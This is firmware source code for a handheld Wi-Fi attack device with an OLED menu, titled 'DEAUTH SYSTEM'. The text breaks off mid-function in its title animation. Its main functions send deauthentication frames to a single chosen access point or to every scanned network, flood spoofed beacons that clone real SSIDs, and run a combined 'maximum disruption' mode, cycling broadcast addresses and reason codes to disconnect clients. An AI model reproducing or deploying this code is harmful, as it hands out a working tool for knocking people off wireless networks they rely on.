
// Wifi
#include "wifi_conf.h"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// Misc
#undef max
#undef min
#include <SPI.h>
#define SPI_MODE0 0x00

// Define min and max functions to fix errors
template<typename T>
T min(T a, T b) { return (a < b) ? a : b; }

template<typename T>
T max(T a, T b) { return (a > b) ? a : b; }
#include "vector"
#include "map"
#include "debug.h"
#include <Wire.h>

// Display
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Pins
#define BTN_DOWN PA27
#define BTN_UP PA12
#define BTN_OK PA13

// VARIABLES
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];

  short rssi;
  uint channel;
} WiFiScanResult;

// Credentials for you Wifi network
char *ssid = "Kupalka";
char *pass = "password";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
WiFiServer server(80);
bool deauth_running = false;
uint8_t deauth_bssid[6];
uint8_t becaon_bssid[6];
uint16_t deauth_reason;
String SelectedSSID;
String SSIDCh;

int attackstate = 0;
int menustate = 0;
bool menuscroll = true;
bool okstate = true;
int scrollindex = 0;
int perdeauth = 3;

// timing variables
unsigned long lastDownTime = 0;
unsigned long lastUpTime = 0;
unsigned long lastOkTime = 0;
const unsigned long DEBOUNCE_DELAY = 150;

// IMAGES
static const unsigned char PROGMEM image_wifi_not_connected__copy__bits[] = { 0x21, 0xf0, 0x00, 0x16, 0x0c, 0x00, 0x08, 0x03, 0x00, 0x25, 0xf0, 0x80, 0x42, 0x0c, 0x40, 0x89, 0x02, 0x20, 0x10, 0xa1, 0x00, 0x23, 0x58, 0x80, 0x04, 0x24, 0x00, 0x08, 0x52, 0x00, 0x01, 0xa8, 0x00, 0x02, 0x04, 0x00, 0x00, 0x42, 0x00, 0x00, 0xa1, 0x00, 0x00, 0x40, 0x80, 0x00, 0x00, 0x00 };
static const unsigned char PROGMEM image_off_text_bits[] = { 0x67, 0x70, 0x94, 0x40, 0x96, 0x60, 0x94, 0x40, 0x64, 0x40 };
static const unsigned char PROGMEM image_network_not_connected_bits[] = { 0x82, 0x0e, 0x44, 0x0a, 0x28, 0x0a, 0x10, 0x0a, 0x28, 0xea, 0x44, 0xaa, 0x82, 0xaa, 0x00, 0xaa, 0x0e, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0x0a, 0xaa, 0xea, 0xaa, 0xaa, 0xaa, 0xee, 0xee, 0x00, 0x00 };
static const unsigned char PROGMEM image_cross_contour_bits[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x80, 0x51, 0x40, 0x8a, 0x20, 0x44, 0x40, 0x20, 0x80, 0x11, 0x00, 0x20, 0x80, 0x44, 0x40, 0x8a, 0x20, 0x51, 0x40, 0x20, 0x80, 0x00, 0x00, 0x00, 0x00 };

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}
void selectedmenu(String text) {
  display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
  display.println(text);
  display.setTextColor(SSD1306_WHITE, SSD1306_BLACK);
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi Networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" Done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" Failed!\n");
    return 1;
  }
}


void Single() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 10);
  display.println("Single Attack");
  display.display();

  unsigned long lastUpdateTime = 0;
  int attackCount = 0;
  unsigned long startTime = millis();

  while (true) {
    // Set target and channel
    memcpy(deauth_bssid, scan_results[scrollindex].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[scrollindex].channel);

    // Check for exit button
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }

    // Send deauth packets with different reason codes
    deauth_reason = 1;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 4;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
    deauth_reason = 16;
    wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);

    // Increment counter
    attackCount += 3;

    // Update display periodically
    unsigned long currentTime = millis();
    if (currentTime - lastUpdateTime > 500) {
      display.clearDisplay();
      display.setTextColor(SSD1306_WHITE);
      display.setTextSize(1);

      // Title with frame
      drawStatusBar("SINGLE ATTACK");
      drawFrame();

      // Display target information
      display.setCursor(5, 15);
      display.print("Target: ");
      if (scan_results[scrollindex].ssid.length() > 10) {
        display.println(scan_results[scrollindex].ssid.substring(0, 8) + "..");
      } else {
        display.println(scan_results[scrollindex].ssid);
      }

      // Simplified target info without channel
      display.setCursor(5, 25);
      display.print("Target RSSI: ");
      display.print(scan_results[scrollindex].rssi);
      display.print(" dBm");

      // Display packets sent
      display.setCursor(5, 35);
      display.print("Packets: ");
      display.println(attackCount);

      // Show time running
      display.setCursor(5, 45);
      display.print("Time: ");
      display.print((currentTime - startTime) / 1000);
      display.println("s");

      // Draw intensity progress bar
      drawProgressBar(5, 55, 118, 8, (perdeauth * 100) / 10);

      display.display();
      lastUpdateTime = currentTime;
    }
  }
}
void All() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);
  display.setCursor(5, 15);
  display.println("Attacking All Networks");
  display.display();

  // Sort networks by signal strength first
  std::vector<size_t> sorted_indices;
  for (size_t i = 0; i < scan_results.size(); i++) {
    sorted_indices.push_back(i);
  }

  // Sort networks by signal strength (RSSI) - higher values first
  for (size_t i = 0; i < sorted_indices.size(); i++) {
    for (size_t j = i + 1; j < sorted_indices.size(); j++) {
      if (scan_results[sorted_indices[i]].rssi < scan_results[sorted_indices[j]].rssi) {
        // Swap indices
        size_t temp = sorted_indices[i];
        sorted_indices[i] = sorted_indices[j];
        sorted_indices[j] = temp;
      }
    }
  }

  // Define common client MAC addresses to target
  uint8_t common_macs[][6] = {
    {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}, // Broadcast
    {0x01, 0x00, 0x5E, 0x00, 0x00, 0x01}, // Multicast
    {0x01, 0x00, 0x0C, 0x00, 0x00, 0x00}, // Cisco multicast
    {0x33, 0x33, 0x00, 0x00, 0x00, 0x01}  // IPv6 multicast
  };

  // Enhanced deauth reason codes that are more effective
  uint16_t reason_codes[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  int networkIndex = 0;
  int attackCount = 0;

  while (true) {
    unsigned long currentTime = millis();

    // Check for exit condition
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }

    // Get the network to attack in this iteration (rotating through sorted networks)
    size_t idx = sorted_indices[networkIndex];
    networkIndex = (networkIndex + 1) % sorted_indices.size();

    // Copy target network BSSID and set channel
    memcpy(deauth_bssid, scan_results[idx].bssid, 6);
    wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

    // Update display periodically (every 500ms)
    if (currentTime - lastUpdateTime > 500) {
      display.clearDisplay();
      display.setTextColor(SSD1306_WHITE);
      display.setTextSize(1);
      display.setCursor(5, 10);
      display.println("Attacking All Networks");

      // Show attack stats
      display.setCursor(5, 25);
      display.print("Target: ");
      if (scan_results[idx].ssid.length() > 10) {
        display.println(scan_results[idx].ssid.substring(0, 8) + "..");
      } else {
        display.println(scan_results[idx].ssid);
      }

      display.setCursor(5, 35);
      display.print("Ch: ");
      display.print(scan_results[idx].channel);
      display.print(" | Pkts: ");
      display.println(attackCount);

      // Show time running
      display.setCursor(5, 45);
      display.print("Time: ");
      display.print((currentTime - startTime) / 1000);
      display.println("s");

      // Draw progress bar for intensity
      drawProgressBar(5, 55, 118, 8, (perdeauth * 100) / 10); // Scale to max 10

      display.display();
      lastUpdateTime = currentTime;
    }

    // Send deauth packets to various targets with different reason codes
    for (size_t m = 0; m < sizeof(common_macs)/sizeof(common_macs[0]); m++) {
      for (size_t r = 0; r < sizeof(reason_codes)/sizeof(reason_codes[0]); r += 5) { // Skip some codes to save time
        for (int x = 0; x < perdeauth; x++) {
          // Target specific clients with this network
          wifi_tx_deauth_frame(deauth_bssid, (void *)common_macs[m], reason_codes[r]);
          attackCount++;

          // Small delay to prevent flooding too quickly
          if (r % 3 == 0) delayMicroseconds(500);
        }
      }
    }

    // Small delay between networks to give the device time to switch channels
    delay(10);
  }
}
void BecaonDeauth() {
  display.clearDisplay();

  // Start with dramatic launch sequence
  for (int i = 3; i > 0; i--) {
    display.clearDisplay();
    display.setTextColor(WHITE);

    // Countdown frame
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Warning text
    display.setTextSize(1);
    display.setCursor(15, 10);
    display.print("LAUNCHING COMBO ATTACK");

    // Countdown number
    display.setTextSize(3);
    display.setCursor(58, 25);
    display.print(i);

    // Warning text
    display.setTextSize(1);
    display.setCursor(10, 50);
    display.print("MAXIMUM DISRUPTION MODE");

    display.display();
    delay(700);
  }

  // Final "GO" screen
  display.clearDisplay();
  display.fillScreen(WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(3);
  display.setCursor(40, 25);
  display.print("GO!");
  display.display();
  delay(400);

  // Attack variables
  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  int beaconCount = 0;
  int deauthCount = 0;
  int networkIndex = 0;
  int totalNetworks = scan_results.size();
  bool animState = false;
  unsigned long blinkTimer = 0;

  // Multiple reason codes for more effective deauth
  uint16_t reasonCodes[] = {1, 2, 4, 5, 7};

  while (true) {
    // Exit condition
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }

    // Cycle through networks
    int targetsPerCycle = min(3, totalNetworks);
    for (int i = 0; i < targetsPerCycle; i++) {
      int idx = (networkIndex + i) % totalNetworks;
      String ssid1 = scan_results[idx].ssid;
      const char *ssid1_cstr = ssid1.c_str();

      memcpy(becaon_bssid, scan_results[idx].bssid, 6);
      memcpy(deauth_bssid, scan_results[idx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      // Send combined attack packets
      for (int x = 0; x < perdeauth; x++) {
        // Send beacon frame
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        beaconCount++;

        // Send multiple deauth frames with different reason codes
        for (size_t r = 0; r < sizeof(reasonCodes)/sizeof(reasonCodes[0]); r++) {
          wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", reasonCodes[r]);
          deauthCount++;
        }
      }
    }

    // Rotate to next network group
    networkIndex = (networkIndex + targetsPerCycle) % totalNetworks;

    // Update display at regular intervals
    if (millis() - lastUpdateTime > 250) {
      display.clearDisplay();

      // Blinking effect for warning indicator
      if (millis() - blinkTimer > 500) {
        animState = !animState;
        blinkTimer = millis();
      }

      // Warning header with animation
      display.fillRect(0, 0, SCREEN_WIDTH, 10, animState ? WHITE : BLACK);
      display.setTextColor(animState ? BLACK : WHITE);
      display.setTextSize(1);
      display.setCursor(8, 1);
      display.print("!! COMBO ATTACK ACTIVE !!");

      // Draw frame
      display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

      // Hazard corners that flash
      if (animState) {
        display.fillTriangle(0, 0, 12, 0, 0, 12, WHITE);
        display.fillTriangle(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-13, 0, SCREEN_WIDTH-1, 12, WHITE);
        display.fillTriangle(0, SCREEN_HEIGHT-1, 12, SCREEN_HEIGHT-1, 0, SCREEN_HEIGHT-13, WHITE);
        display.fillTriangle(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-13, SCREEN_HEIGHT-1, SCREEN_WIDTH-1, SCREEN_HEIGHT-13, WHITE);
      }

      // Current target info
      display.setTextColor(WHITE);
      display.setCursor(5, 15);
      display.print("TARGET: ");
      String currentTarget = scan_results[networkIndex].ssid;
      if (currentTarget.length() > 10) {
        currentTarget = currentTarget.substring(0, 8) + "..";
      }
      display.println(currentTarget);

      // Channel info
      display.setCursor(5, 25);
      display.print("CH: ");
      display.print(scan_results[networkIndex].channel);
      display.print(" | ");
      display.print(scan_results[networkIndex].channel >= 36 ? "5G" : "2.4G");

      // Stats - two bars showing packets sent
      display.setCursor(5, 35);
      display.print("BEACONS: ");
      display.print(beaconCount);
      drawProgressBar(70, 35, 53, 6, min(beaconCount / 50, 100));

      display.setCursor(5, 45);
      display.print("DEAUTHS: ");
      display.print(deauthCount);
      drawProgressBar(70, 45, 53, 6, min(deauthCount / 50, 100));

      // Time info
      display.setCursor(5, 55);
      display.print("TIME: ");
      display.print((millis() - startTime) / 1000);
      display.print("s");

      // Progress indicator of network scanning
      display.fillRect(105, 55, 20, 8, WHITE);
      display.setTextColor(BLACK);
      display.setCursor(108, 56);
      display.print(networkIndex % 10);
      display.print("/");
      display.print(totalNetworks % 10);

      display.display();
      lastUpdateTime = millis();
    }
  }
}
void Becaon() {
  display.clearDisplay();
  display.setTextColor(SSD1306_WHITE);
  display.setTextSize(1);

  // Initial animation effect
  for (int i = 0; i < 5; i++) {
    display.clearDisplay();
    // Draw warning triangles that pulse
    display.fillTriangle(32, 15+i, 42+i, 32, 22-i, 32, WHITE);
    display.fillTriangle(96, 15+i, 106+i, 32, 86-i, 32, WHITE);

    // Animated title
    display.fillRect(0, 0, SCREEN_WIDTH, 12, i % 2 == 0 ? WHITE : BLACK);
    display.setTextColor(i % 2 == 0 ? BLACK : WHITE);
    display.setTextSize(1);
    display.setCursor(20, 2);
    display.print("BEACON FLOOD ATTACK");

    display.setTextColor(WHITE);
    display.setCursor(10, 38);
    display.print("INITIALIZING");
    for (int j = 0; j < i; j++) display.print(".");

    display.display();
    delay(200);
  }

  // Attack variables
  unsigned long startTime = millis();
  unsigned long lastUpdateTime = 0;
  unsigned long beaconCount = 0;
  int currentNetIndex = 0;

  while (true) {
    // Exit condition
    if (digitalRead(BTN_OK) == LOW) {
      delay(100);
      break;
    }

    // Cycle through all networks and flood with beacons
    for (size_t i = 0; i < min((size_t)5, scan_results.size()); i++) {
      int idx = (currentNetIndex + i) % scan_results.size();
      String ssid1 = scan_results[idx].ssid;
      const char *ssid1_cstr = ssid1.c_str();

      memcpy(becaon_bssid, scan_results[idx].bssid, 6);
      wext_set_channel(WLAN0_NAME, scan_results[idx].channel);

      // Send beacon frames
      for (int x = 0; x < perdeauth * 2; x++) {
        wifi_tx_beacon_frame(becaon_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", ssid1_cstr);
        beaconCount++;
      }
    }

    // Update display every 300ms
    if (millis() - lastUpdateTime > 300) {
      display.clearDisplay();

      // Draw title bar with hazard stripes
      display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
      for (int s = 0; s < SCREEN_WIDTH; s+= 10) {
        display.fillRect(s, 0, 5, 12, BLACK);
      }
      display.setTextColor(WHITE);
      display.setCursor(15, 2);
      display.print("BEACON FLOOD ACTIVE");

      // Draw attack frame
      display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
      display.drawRect(2, 14, SCREEN_WIDTH-4, SCREEN_HEIGHT-16, WHITE);

      // Current network being attacked
      currentNetIndex = (currentNetIndex + 1) % scan_results.size();
      display.setTextColor(WHITE);

      // Show current network
      display.setCursor(5, 17);
      display.print("FLOODING ");
      display.print(scan_results.size());
      display.print(" NETWORKS");

      // Current target
      display.setCursor(5, 27);
      String currTarget = scan_results[currentNetIndex].ssid;
      if (currTarget.length() > 14) {
        currTarget = currTarget.substring(0, 12) + "..";
      }
      display.print("NOW: ");
      display.print(currTarget);

      // Stats display
      display.setCursor(5, 37);
      display.print("SENT: ");
      display.print(beaconCount);
      display.print(" BEACONS");

      // Time running
      display.setCursor(5, 47);
      unsigned long runTime = (millis() - startTime) / 1000;
      display.print("TIME: ");
      display.print(runTime);
      display.print("s");

      // Draw intensity bar
      drawProgressBar(5, 55, 118, 8, (perdeauth * 100) / 10);

      display.display();
      lastUpdateTime = millis();
    }
  }
}
// Custom UI elements
void drawFrame() {
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(2, 2, SCREEN_WIDTH - 4, SCREEN_HEIGHT - 4, WHITE);
}

void drawProgressBar(int x, int y, int width, int height, int progress) {
  display.drawRect(x, y, width, height, WHITE);
  display.fillRect(x + 2, y + 2, (width - 4) * progress / 100, height - 4, WHITE);
}

void drawMenuItem(int y, const char *text, bool selected) {
  if (selected) {
    display.fillRect(4, y - 1, SCREEN_WIDTH - 8, 11, WHITE);
    display.setTextColor(BLACK);
  } else {
    display.setTextColor(WHITE);
  }
  display.setCursor(8, y);
  display.print(text);
}

void drawStatusBar(const char *status) {
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print(status);
  display.setTextColor(WHITE);
}



void drawMainMenu(int selectedIndex) {
  display.clearDisplay();

  // Tech frame with double lines and ornate corners
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
  display.drawRect(3, 3, SCREEN_WIDTH-6, SCREEN_HEIGHT-6, WHITE);

  // Corner designs
  display.fillTriangle(0, 0, 10, 0, 0, 10, WHITE);
  display.fillTriangle(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-11, 0, SCREEN_WIDTH-1, 10, WHITE);
  display.fillTriangle(0, SCREEN_HEIGHT-1, 10, SCREEN_HEIGHT-1, 0, SCREEN_HEIGHT-11, WHITE);
  display.fillTriangle(SCREEN_WIDTH-1, SCREEN_HEIGHT-1, SCREEN_WIDTH-11, SCREEN_HEIGHT-1, SCREEN_WIDTH-1, SCREEN_HEIGHT-11, WHITE);

  // Glowing title bar
  display.fillRect(0, 0, SCREEN_WIDTH, 12, WHITE);
  display.setTextColor(BLACK);
  display.setTextSize(1);
  display.setCursor(28, 2);
  display.print("DEAUTH SYSTEM");

  // Menu items with enhanced visual style and icons
  const char *menuItems[] = { ">> ATTACK", ">> SCAN", ">> SELECT" };
  for (int i = 0; i < 3; i++) {
    // Draw selection box with glow effect
    if (i == selectedIndex) {
      display.fillRect(10, 18 + (i * 15), SCREEN_WIDTH-20, 12, WHITE);
      display.setTextColor(BLACK);
    } else {
      display.drawRect(10, 18 + (i * 15), SCREEN_WIDTH-20, 12, WHITE);
      display.setTextColor(WHITE);
    }

    // Draw menu text
    display.setCursor(15, 20 + (i * 15));
    display.print(menuItems[i]);

    // Draw icons
    if (i == 0) { // Attack - lightning bolt
      if (i == selectedIndex) {
        display.drawLine(100, 20 + (i * 15), 107, 24 + (i * 15), BLACK);
        display.drawLine(107, 24 + (i * 15), 103, 26 + (i * 15), BLACK);
        display.drawLine(103, 26 + (i * 15), 110, 30 + (i * 15), BLACK);
      } else {
        display.drawLine(100, 20 + (i * 15), 107, 24 + (i * 15), WHITE);
        display.drawLine(107, 24 + (i * 15), 103, 26 + (i * 15), WHITE);
        display.drawLine(103, 26 + (i * 15), 110, 30 + (i * 15), WHITE);
      }
    } else if (i == 1) { // Scan - radar
      if (i == selectedIndex) {
        display.drawCircle(105, 24 + (i * 15), 5, BLACK);
        display.drawCircle(105, 24 + (i * 15), 3, BLACK);
        display.drawLine(105, 24 + (i * 15), 110, 19 + (i * 15), BLACK);
      } else {
        display.drawCircle(105, 24 + (i * 15), 5, WHITE);
        display.drawCircle(105, 24 + (i * 15), 3, WHITE);
        display.drawLine(105, 24 + (i * 15), 110, 19 + (i * 15), WHITE);
      }
    } else if (i == 2) { // Select - target
      if (i == selectedIndex) {
        display.drawCircle(105, 24 + (i * 15), 5, BLACK);
        display.drawLine(105, 19 + (i * 15), 105, 29 + (i * 15), BLACK);
        display.drawLine(100, 24 + (i * 15), 110, 24 + (i * 15), BLACK);
      } else {
        display.drawCircle(105, 24 + (i * 15), 5, WHITE);
        display.drawLine(105, 19 + (i * 15), 105, 29 + (i * 15), WHITE);
        display.drawLine(100, 24 + (i * 15), 110, 24 + (i * 15), WHITE);
      }
    }
  }

  // System status
  display.setTextColor(WHITE);
  display.setCursor(5, 54);
  display.print(scan_results.size());

  // Network count is sufficient

  display.display();
}

void drawScanScreen() {
  display.clearDisplay();

  // Matrix-like falling characters in the background
  static const char matrixChars[] = { '0', '1', 'X', '#', '*', '>', '<', '=' };
  static int charPositions[16] = {0}; // Positions for falling chars

  // Loop with enhanced hacker animations
  for (int i = 0; i < 20; i++) {
    display.clearDisplay();

    // Draw animated matrix-like background
    for (int j = 0; j < 16; j++) {
      int x = 8 * j;
      charPositions[j] = (charPositions[j] + random(0, 3)) % 64;
      display.setTextColor(WHITE);
      display.setTextSize(1);
      display.setCursor(x, charPositions[j]);
      display.print(matrixChars[random(0, sizeof(matrixChars))]);
    }

    // Draw targeting frame
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);
    display.drawRect(2, 2, SCREEN_WIDTH-4, SCREEN_HEIGHT-4, WHITE);

    // Draw corner accents
    display.drawLine(0, 0, 10, 0, WHITE);
    display.drawLine(0, 0, 0, 10, WHITE);
    display.drawLine(SCREEN_WIDTH-11, 0, SCREEN_WIDTH-1, 0, WHITE);
    display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-1, 10, WHITE);

    // Title with glitch effect
    display.fillRect(15, 0, 98, 12, i % 2 == 0 ? WHITE : BLACK);
    display.setTextColor(i % 2 == 0 ? BLACK : WHITE);
    display.setCursor(38, 2);
    display.print("SCANNING");

    // Progress indicators
    String progressChars = "";
    for (int p = 0; p < 10; p++) {
      if (p < i/2) progressChars += ">";
      else progressChars += ".";
    }
    display.setTextColor(WHITE);
    display.setCursor(35, 30);
    display.print(progressChars);

    // Progress percentage
    display.setCursor(40, 45);
    display.print(i * 5);
    display.print("%");

    display.display();
    delay(250);
  }

  // Final screen flash for completion effect
  for (int f = 0; f < 3; f++) {
    display.invertDisplay(true);
    delay(100);
    display.invertDisplay(false);
    delay(100);
  }
}

void drawNetworkList(const String &selectedSSID, const String &channelType, int scrollIndex) {
  display.clearDisplay();

  // Draw frame with tech aesthetic
  display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

  // Draw corner accents
  display.drawLine(0, 0, 10, 0, WHITE);
  display.drawLine(0, 0, 0, 10, WHITE);
  display.drawLine(SCREEN_WIDTH-11, 0, SCREEN_WIDTH-1, 0, WHITE);
  display.drawLine(SCREEN_WIDTH-1, 0, SCREEN_WIDTH-1, 10, WHITE);

  // Header
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  display.setTextColor(BLACK);
  display.setCursor(4, 1);
  display.print("NET");
  display.print("[");
  display.print(scrollIndex + 1);
  display.print("/");
  display.print(scan_results.size());
  display.print("]");

  // Network info box
  display.setTextColor(WHITE);
  display.drawRect(5, 15, SCREEN_WIDTH-10, 40, WHITE);

  // SSID display
  String displaySSID = selectedSSID;
  if (displaySSID.length() > 14) {
    displaySSID = displaySSID.substring(0, 12) + "..";
  }
  display.setCursor(9, 20);
  display.print(displaySSID);

  // Channel info
  display.drawLine(5, 30, SCREEN_WIDTH-5, 30, WHITE);
  display.setCursor(9, 35);
  display.print("CH:");
  display.print(scan_results[scrollIndex].channel);
  display.print(" | ");
  display.print(channelType);

  // RSSI display
  display.setCursor(9, 45);
  display.print("RSSI:");
  display.print(scan_results[scrollIndex].rssi);
  display.print("dBm");

  // Scroll indicators
  if (scrollIndex > 0) {
    display.fillTriangle(64, 58, 60, 62, 68, 62, WHITE);
  }
  if (static_cast<size_t>(scrollIndex) < scan_results.size() - 1) {
    display.fillTriangle(84, 62, 80, 58, 88, 58, WHITE);
  }

  display.display();
}

void drawAttackScreen(int attackType) {
  // Dramatic startup animation
  for (int i = 0; i < 5; i++) {
    display.clearDisplay();

    // Alternating flash effect
    if (i % 2 == 0) {
      display.fillScreen(WHITE);
      display.display();
      delay(50);
      continue;
    }

    // Attack warning signs
    display.drawRect(0, 0, SCREEN_WIDTH, SCREEN_HEIGHT, WHITE);

    // Hazard stripes that expand
    for (int j = 0; j < 4; j++) {
      int offset = (i * 3) % 20;
      display.fillRect(offset + j*20, 0, 10, 10, WHITE);
      display.fillRect(offset + j*20, SCREEN_HEIGHT-10, 10, 10, WHITE);
    }

    display.setTextColor(WHITE);
    display.setTextSize(1);
    display.setCursor(12, 20);
    display.print("INITIALIZING ATTACK");

    // Countdown animation
    display.setTextSize(2);
    display.setCursor(50, 35);
    display.print("T-");
    display.print(5-i);

    display.display();
    delay(200);
  }

  // Final attack launch screen
  display.clearDisplay();

  // Explosive pattern
  for (int r = 0; r < 4; r++) {
    display.clearDisplay();

    // Expanding circle effect
    for (int rad = 0; rad < 30; rad += 10) {
      display.drawCircle(SCREEN_WIDTH/2, SCREEN_HEIGHT/2, rad + r*8, WHITE);
    }

    // Attack type indicator with dramatic presentation
    display.setTextColor(WHITE);
    display.setTextSize(1);

    // Attack type names
    const char *attackTypes[] = {
      "SINGLE DEAUTH",
      "ALL DEAUTH",
      "BEACON FLOOD",
      "COMBO ATTACK"
    };

    if (attackType >= 0 && attackType < 4) {
      // Center the text
      int textWidth = strlen(attackTypes[attackType]) * 6;
      display.setCursor((SCREEN_WIDTH - textWidth) / 2, SCREEN_HEIGHT/2 - 4);
      display.print(attackTypes[attackType]);
    }

    display.display();
    delay(150);
  }

  // Main attack screen
  display.clearDisplay();
  drawFrame();

  // Warning banner with hazard stripes
  display.fillRect(0, 0, SCREEN_WIDTH, 10, WHITE);
  for (int s = 0; s < SCREEN_WIDTH; s += 16) {
    display.fillRect(s, 0, 8, 10, BLACK);
  }

  display.setTextColor(WHITE);
  display.setCursor(15, 1);
  display.print("ATTACK LAUNCHED");

  display.setTextColor(WHITE);
  display.setCursor(10, 20);

  // Attack type indicator with icon
  const char *attackTypes[] = {
    "SINGLE DEAUTH",
    "ALL DEAUTH",
    "BEACON FLOOD",
    "COMBO ATTACK"
  };

  if (attackType >= 0 && attackType < 4) {
    display.print(attackTypes[attackType]);

    // Draw attack-specific icon
    if (attackType == 0) { // Single target
      display.drawCircle(100, 20, 6, WHITE);
      display.drawLine(97, 17, 103, 23, WHITE);
      display.drawLine(103, 17, 97, 23, WHITE);
    } else if (attackType == 1) { // Mass deauth
      for (int d = 0; d < 3; d++) {
        display.drawCircle(95+d*5, 20, 3, WHITE);
        display.drawLine(95+d*5-2, 20-2, 95+d*5+2, 20+2, WHITE);
      }
    } else if (attackType == 2) { // Beacon
      display.drawTriangle(100, 14, 95, 24, 105, 24, WHITE);
      display.drawLine(100, 14, 100, 10, WHITE);
    } else if (attackType == 3) { // Combo
      display.drawCircle(100, 20, 6, WHITE);
      display.drawLine(95, 20, 105, 20, WHITE);
      display.drawLine(100, 15, 100, 25, WHITE);
    }
  }

  // Progress bar animation
  display.drawRect(10, 34, SCREEN_WIDTH - 20, 8, WHITE);

  // Animated loading sequence
  static const char patterns[] = { '.', 'o', 'O', '*', 'X', '*', 'O', 'o' };
  for (size_t i = 0; i < sizeof(patterns); i++) {
    // Fill progress bar
    int fillWidth = ((i+1) * (SCREEN_WIDTH - 24)) / sizeof(patterns);
    display.fillRect(12, 36, fillWidth, 4, WHITE);

    // Draw text
    display.setCursor(20, 48);
    display.print("PREPARING");
    for (size_t j = 0; j <= i; j++) {
      display.print(patterns[j % 4]);
    }

    display.display();
    delay(150);
  }

  // Final "READY" indicator
  display.setCursor(35, 48);
  display.print("READY!");
  display.display();
  delay(500);
}
void titleScreen(void) {
  // Initial evil wake-up sequence
  for (int i = 0; i < 3; i++) {
    display.clearDisplay();
    display.fillScreen(WHITE);
    display.display();
    delay(50);
    display.clearDisplay();
    display.display();
    delay(100);
  }

  // Evil eye opening animation
  for (int i = 0; i < 8; i++) {
    display.clearDisplay();
    // Draw evil eye
    display.fillCircle(64, 32, 20 - i, WHITE);
    display.fillCircle(64, 32, 18 - i, BLACK);
    display.fillCircle(64, 32, 8, WHITE);
    display.fillCircle(64, 32, 3, BLACK);
    display.display();
    delay(80);
  }

  // Evil title glitch effect
  for (int f = 0; f < 12; f++) {
    display.clearDisplay();
    // Draw pentagram in background
    display.drawLine(64, 10, 80, 40, WHITE);
    display.drawLine(80, 40, 48, 25, WHITE);
    display.drawLine(48, 25, 80, 25, WHITE);
    display.drawLine(80, 25, 48, 40, WHITE);
    display.drawLine(48, 40, 64, 10, WHITE);

    // Draw glitchy skull
